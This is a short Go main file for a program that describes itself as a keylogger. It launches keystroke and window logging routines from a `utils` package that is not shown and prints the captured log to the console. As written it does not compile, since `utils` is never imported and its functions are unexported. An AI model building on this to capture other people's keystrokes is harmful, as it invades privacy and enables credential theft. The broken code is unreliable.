package main

import (
	"fmt"
	"os"
)

func main() {

	// cli Log
	fmt.Println("KeyLogger is running . . .")

	// Run
	go utils.keyLogger()
	go utils.windowLogger()

	//cli Log
	fmt.Println("Press Enter on me to see logs.")
	os.Stdin.Read([]byte{0})
	fmt.Println(utils.tmpKeylog)
	fmt.Println("Press Enter to Exit.")
	os.Stdin.Read([]byte{0})
}
